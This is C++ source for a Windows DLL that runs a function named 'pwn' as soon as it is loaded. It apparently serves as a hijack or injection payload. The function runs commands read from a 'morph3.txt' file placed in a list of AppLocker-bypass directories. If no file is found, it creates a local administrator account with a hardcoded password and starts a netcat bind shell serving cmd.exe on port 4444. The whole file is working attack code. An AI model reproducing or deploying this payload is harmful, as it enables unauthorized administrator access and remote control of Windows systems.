// dllmain.cpp : Defines the entry point for the DLL application.

#include "pch.h"

#ifdef _WIN32
    #include <io.h> 
#else
    #include <unistd.h>
#endif
#include <iostream>
#include <fstream>
#include <string>
#include <list>
using namespace std;


bool file_exists(const std::string& Filename)
{
    return _access_s(Filename.c_str(), 0) == 0;
}

void pwn()
{
    /*
    First try to find the environment variable MORPH3_CMD,
    if it environment variable exists, simply execute it's value
    */
    /*
    LPTSTR lpszVariable;
    LPWCH lpvEnv;
    // Get a pointer to the environment block

    lpvEnv = GetEnvironmentStrings();
    lpszVariable = (LPTSTR)lpvEnv;

    string var;
    string my_var = "MORPH3_FLAG";
    while (*lpszVariable){
        //wprintf(L"%s\n", lpszVariable);
        //var = CT2A(lpszVariable);
        var = lpszVariable.c_str();

        if ((var).find("APPDATA") != string::npos) {
            // we found the variable let's print it
            cout << "[+] MORPH3_FLAG was found in environment variables" << var << "\n";
            // if MORPH3_ENV_EXEC is 1, execute MORPH3_CMD else continue with the following block
            // executing the following thing
            wprintf(L"%s\n", lpszVariable);
        }

        lpszVariable += lstrlen(lpszVariable) + 1;

    }
    return;
    */


    bool applocker_flag = false;
    list<string> applocker_bypass_paths;

    applocker_bypass_paths.push_back("C:\\Windows\\Tasks\\");
    applocker_bypass_paths.push_back("C:\\Windows\\Temp\\");
    applocker_bypass_paths.push_back("C:\\windows\\tracing\\");
    applocker_bypass_paths.push_back("C:\\Windows\\Registration\\CRMLog\\");
    applocker_bypass_paths.push_back("C:\\Windows\\System32\\FxsTmp\\");
    applocker_bypass_paths.push_back("C:\\Windows\\System32\\com\\dmp\\");
    applocker_bypass_paths.push_back("C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys\\");
    applocker_bypass_paths.push_back("C:\\Windows\\System32\\spool\\PRINTERS\\");
    applocker_bypass_paths.push_back("C:\\Windows\\System32\\spool\\SERVERS\\");
    applocker_bypass_paths.push_back("C:\\Windows\\System32\\spool\\drivers\\color\\");
    applocker_bypass_paths.push_back("C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SyncCenter\\");
    applocker_bypass_paths.push_back("C:\\Windows\\System32\\Tasks_Migrated (after peforming a version upgrade of Windows 10)\\");
    applocker_bypass_paths.push_back("C:\\Windows\\SysWOW64\\FxsTmp\\");
    applocker_bypass_paths.push_back("C:\\Windows\\SysWOW64\\com\\dmp\\");
    applocker_bypass_paths.push_back("C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\SyncCenter\\");
    applocker_bypass_paths.push_back("C:\\Windows\\SysWOW64\\Tasks\\Microsoft\\Windows\\PLA\\System\\");


    for (auto const& path : applocker_bypass_paths) {

        //cout << path + "morph3.txt" << "\n";
        if (file_exists(path + "morph3.txt")) {
            cout << "[+] Found morph3.txt at path: " << path + "morph3.txt" << "\n";
            cout << "[*] Reading and executing the contents of it" << "\n";


            ifstream my_file;
            string content;
            my_file.open(path + "morph3.txt");

            while (getline(my_file, content)) {
                system(content.c_str()); // execute everyline in the file
            }
            my_file.close();
            applocker_flag = true;

            /*

            stringstream str_stream;
            str_stream << my_file.rdbuf();
            string content = str_stream.str();

            std::cout << content << "\n";

            system(content.c_str()); // execute whole file but this will only be just 1 line.

            my_file.close();
            cout << content;
            */

        }
        else {
            cout << "[-] Could not found " << path + "morph3.txt" << "\n";
        }
    }
    if (applocker_flag) {
        return;
    }

    // if applocker_flag is false, it means that we could not find or execute any commands yet, continue with a default payload

    system("net user morph3 Password123! /add");
    system("net localgroup Administrators morph3 /add");

    system("C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd.exe 4444"); // listen on local port 4444

    //WinExec("cmd.exe",1);
    //system("cmd.exe");
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        pwn();
    case DLL_THREAD_ATTACH:
        pwn();
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

